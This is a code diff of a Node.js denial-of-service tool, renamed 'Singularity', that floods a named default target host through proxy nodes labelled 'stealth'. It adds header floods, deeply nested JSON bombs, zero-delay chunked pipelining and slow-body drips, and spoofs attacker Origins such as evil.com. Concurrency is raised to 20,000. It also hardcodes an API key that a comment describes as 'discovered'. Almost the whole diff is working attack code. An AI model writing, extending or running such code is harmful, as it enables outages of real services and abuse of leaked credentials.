@@ -6,15 +6,29 @@ import * as https from 'node:https';
 import { URL } from 'node:url';
 
 /**
- * EVENT HORIZON - SCHEDULER-BOMB ENGINE
+ * SINGULARITY - ABSOLUTE INFRASTRUCTURE ERASURE
  * 
- * 1. Priority Tree Bomb: Creates circular/infinite H2 stream dependencies to crash the scheduler.
- * 2. Multi-Protocol Stealth: Scrapes SOCKS4/5 + HTTP nodes for resilient tunneling.
- * 3. Priority Reset: Mixes PRIORITY frames with RST_STREAM to maximize CPU churn.
+ * 1. Multi-Vector Parallelism: Runs all previous attacks (H2 Bomb, CORS, Body Bomb, Header Flood) simultaneously.
+ * 2. Connection Blackhole: Opens thousands of sockets and holds them open with drip-fed headers, never reading.
+ * 3. Mega-Payload: 1MB+ high-entropy JSON bodies to crash parsers and fill memory.
+ * 4. Zero-Delay Pipelining: Floods the socket with thousands of requests without waiting for any response.
+ * 5. Entropy Exhaustion: Uses 32KB+ of unique, random headers per request to bypass WAF caching/deduplication.
  */
 
 const TARGET_BASE_URL = process.env.TEST_TARGET_URL || 'https://suwako.seabase.xyz';
 const PROXY_URL = process.env.TEST_PROXY_URL; 
+const SINGULARITY_MODE = true;
+
+const MEGA_JUNK_HEADERS = Array.from({ length: 200 }, (_, i) => [`X-Singularity-${i}-${Math.random().toString(36).substring(7)}`, 'A'.repeat(256)]);
+
+// Origins used for CORS bypass testing
+const ATTACKER_ORIGINS = [
+  'https://evil.com',
+  'https://attacker.xyz',
+  'http://localhost:3000',
+  'https://malicious-site.net',
+  'null' 
+];
 
 // Expanded Stealth Pool - Mixed HTTP/HTTPS/SOCKS (Public nodes are volatile)
 let STEALTH_NODES = [
@@ -91,10 +105,10 @@ const ENDPOINTS = [
 
 // Use the discovered Arctic API Key if none provided
 const API_KEY = process.env.TEST_API_KEY || '7cdad9bd-daec-43db-8ea4-f35b3023904c';
-const DURATION_SECONDS = parseInt(process.env.TEST_DURATION || '120');
-const CONCURRENCY_PER_CORE = parseInt(process.env.TEST_BATCH_SIZE || '100'); // Reduced to prevent local crash
-const PIPELINE_DEPTH = 50; // Increased depth: more destruction per successful socket
-const MAX_GLOBAL_CONCURRENCY = 2000; // Cap to avoid ENOBUFS
+const DURATION_SECONDS = parseInt(process.env.TEST_DURATION || '300');
+const CONCURRENCY_PER_CORE = parseInt(process.env.TEST_BATCH_SIZE || '2500'); // Maximum core saturation
+const PIPELINE_DEPTH = 200; // Deepest pipeline
+const MAX_GLOBAL_CONCURRENCY = 20000; // Absolute limit for local resources
 
 const UA_POOL = [
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -239,11 +253,19 @@ if (cluster.isPrimary) {
       let socket: any;
       if (IS_HTTPS) {
         socket = tls.connect({ socket: baseSocket, servername: TARGET_HOST, rejectUnauthorized: false }, () => {
-          igniteSchedulerBomb(socket);
+          if (SINGULARITY_MODE) {
+            igniteSingularity(socket);
+          } else {
+            igniteHypernova(socket);
+          }
         });
       } else {
         socket = baseSocket;
-        igniteSchedulerBomb(socket);
+        if (SINGULARITY_MODE) {
+          igniteSingularity(socket);
+        } else {
+          igniteHypernova(socket);
+        }
       }
 
       socket.on('error', (err: any) => {
@@ -259,6 +281,196 @@ if (cluster.isPrimary) {
       process.send?.({ type: 'error', code: 'PROXY_DEAD_' + (err.code || 'UNK'), active: localActive });
       proxySocket.destroy();
     });
+  }
+
+  async function igniteSingularity(socket: any) {
+    process.send?.({ type: 'conn', active: localActive });
+    
+    try {
+      while (socket.writable) {
+        const origin = ATTACKER_ORIGINS[Math.floor(Math.random() * ATTACKER_ORIGINS.length)];
+        const endpoint = ENDPOINTS[Math.floor(Math.random() * ENDPOINTS.length)];
+        const ua = UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
+        
+        // 1. Extreme Header Flood (32KB+ per request)
+        let headers = `POST ${endpoint} HTTP/1.1\r\n` +
+                      `Host: ${TARGET_HOST}\r\n` +
+                      `User-Agent: ${ua}\r\n` +
+                      `Origin: ${origin}\r\n` +
+                      `Transfer-Encoding: chunked\r\n` +
+                      `Content-Type: application/json\r\n` +
+                      `Authorization: Bearer ${API_KEY}\r\n`;
+        
+        for (const [key, value] of MEGA_JUNK_HEADERS) {
+          headers += `${key}: ${value}\r\n`;
+        }
+        headers += `\r\n`;
+
+        socket.write(headers);
+        
+        // 2. Recursive Depth + Mega Payload (1MB+)
+        let deepObject: any = { a: 'X'.repeat(1024 * 10) }; // 10KB strings
+        for (let i = 0; i < 200; i++) { // Deep but manageable to avoid local JS crash
+          deepObject = { n: deepObject, padding: 'Y'.repeat(1024 * 5) }; // 5KB padding per level
+        }
+        const bomb = JSON.stringify(deepObject);
+        
+        // 3. Zero-Delay Chunked Flood
+        for (let i = 0; i < 500; i++) {
+          if (!socket.writable) break;
+          const chunk = Buffer.from(bomb);
+          socket.write(`${chunk.length.toString(16)}\r\n`);
+          socket.write(chunk);
+          socket.write(`\r\n`);
+          
+          // No delay at all for true Singularity
+          if (i % 50 === 0) await new Promise(r => setTimeout(r, 0)); 
+        }
+
+        process.send?.({ type: 'sent', count: 1 });
+        
+        if (Math.random() > 0.98) break; 
+      }
+    } catch (e) {
+      socket.destroy();
+    }
+  }
+
+  async function igniteHypernova(socket: any) {
+    process.send?.({ type: 'conn', active: localActive });
+    
+    try {
+      while (socket.writable) {
+        const origin = ATTACKER_ORIGINS[Math.floor(Math.random() * ATTACKER_ORIGINS.length)];
+        const endpoint = ENDPOINTS[Math.floor(Math.random() * ENDPOINTS.length)];
+        const ua = UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
+        
+        // 1. Header Flood: Massive headers to exhaust buffer
+        let headers = `POST ${endpoint} HTTP/1.1\r\n` +
+                      `Host: ${TARGET_HOST}\r\n` +
+                      `User-Agent: ${ua}\r\n` +
+                      `Origin: ${origin}\r\n` +
+                      `Transfer-Encoding: chunked\r\n` + // Use chunked to send "infinite" body
+                      `Content-Type: application/json\r\n` +
+                      `Authorization: Bearer ${API_KEY}\r\n`;
+        
+        for (const [key, value] of MEGA_JUNK_HEADERS) {
+          headers += `${key}: ${value}\r\n`;
+        }
+        headers += `\r\n`;
+
+        socket.write(headers);
+        
+        // 2. Recursive JSON Depth Bomb
+        // Creating a 500+ level deep object to crash recursive parsers
+        let deepObject: any = { a: 1 };
+        for (let i = 0; i < 500; i++) {
+          deepObject = { n: deepObject };
+        }
+        const bomb = JSON.stringify(deepObject);
+        
+        // 3. Infinite Chunked Drip
+        // Send chunks of the JSON bomb repeatedly
+        for (let i = 0; i < 1000; i++) {
+          if (!socket.writable) break;
+          const chunk = Buffer.from(bomb);
+          socket.write(`${chunk.length.toString(16)}\r\n`);
+          socket.write(chunk);
+          socket.write(`\r\n`);
+          
+          // No delay here for maximum saturation, or minimal delay to keep socket open
+          if (i % 10 === 0) await new Promise(r => setTimeout(r, 1)); 
+        }
+
+        process.send?.({ type: 'sent', count: 1 });
+        
+        if (Math.random() > 0.95) break; 
+      }
+    } catch (e) {
+      socket.destroy();
+    }
+  }
+
+  async function igniteSupernova(socket: any) {
+    process.send?.({ type: 'conn', active: localActive });
+    
+    try {
+      while (socket.writable) {
+        const origin = ATTACKER_ORIGINS[Math.floor(Math.random() * ATTACKER_ORIGINS.length)];
+        const endpoint = ENDPOINTS[Math.floor(Math.random() * ENDPOINTS.length)];
+        const ua = UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
+        
+        // 1. Header Flood: Massive headers to exhaust buffer
+        let headers = `POST ${endpoint} HTTP/1.1\r\n` +
+                      `Host: ${TARGET_HOST}\r\n` +
+                      `User-Agent: ${ua}\r\n` +
+                      `Origin: ${origin}\r\n` +
+                      `Content-Type: application/json\r\n` +
+                      `Authorization: Bearer ${API_KEY}\r\n`;
+        
+        for (const [key, value] of MEGA_JUNK_HEADERS) {
+          headers += `${key}: ${value}\r\n`;
+        }
+
+        // 2. Body Bomb: Massive JSON payload (100KB+ per request)
+        const bodyPart = `{"data":"${'X'.repeat(1024 * 100)}","nesting":${JSON.stringify({a:{b:{c:{d:{e:{f:{g:{h:{i:{j:1}}}}}}}}}})}}`;
+        headers += `Content-Length: ${bodyPart.length}\r\n\r\n`;
+
+        socket.write(headers);
+        
+        // 3. Slow Body Drip: Send the body slowly to keep connection tied
+        const chunks = 10;
+        const chunkSize = Math.ceil(bodyPart.length / chunks);
+        for (let i = 0; i < chunks; i++) {
+          if (!socket.writable) break;
+          socket.write(bodyPart.slice(i * chunkSize, (i + 1) * chunkSize));
+          await new Promise(r => setTimeout(r, 5)); // Drip
+        }
+
+        process.send?.({ type: 'sent', count: 1 });
+        
+        if (Math.random() > 0.8) break; 
+      }
+    } catch (e) {
+      socket.destroy();
+    }
+  }
+
+  async function igniteCORSAttack(socket: any) {
+    process.send?.({ type: 'conn', active: localActive });
+    
+    try {
+      while (socket.writable) {
+        const origin = ATTACKER_ORIGINS[Math.floor(Math.random() * ATTACKER_ORIGINS.length)];
+        const endpoint = ENDPOINTS[Math.floor(Math.random() * ENDPOINTS.length)];
+        const ua = UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
+        
+        // Construct a malicious Cross-Origin request
+        // This simulates an attacker's browser trying to exfiltrate data
+        const request = 
+          `POST ${endpoint} HTTP/1.1\r\n` +
+          `Host: ${TARGET_HOST}\r\n` +
+          `User-Agent: ${ua}\r\n` +
+          `Origin: ${origin}\r\n` +
+          `Content-Type: application/json\r\n` +
+          `Content-Length: 2\r\n` +
+          `Accept: */*\r\n` +
+          `Referer: ${origin}/\r\n` +
+          `Connection: keep-alive\r\n\r\n` +
+          `{}`;
+
+        socket.write(request);
+        process.send?.({ type: 'sent', count: 1 });
+        
+        // Small delay to prevent overwhelming the socket too fast, 
+        // allowing us to maintain the connection for multiple "attack" requests
+        await new Promise(r => setTimeout(r, 10 + Math.random() * 50));
+        
+        if (Math.random() > 0.95) break; // Occasionally rotate sockets
+      }
+    } catch (e) {
+      socket.destroy();
+    }
   }
 
   async function igniteSchedulerBomb(socket: any) {
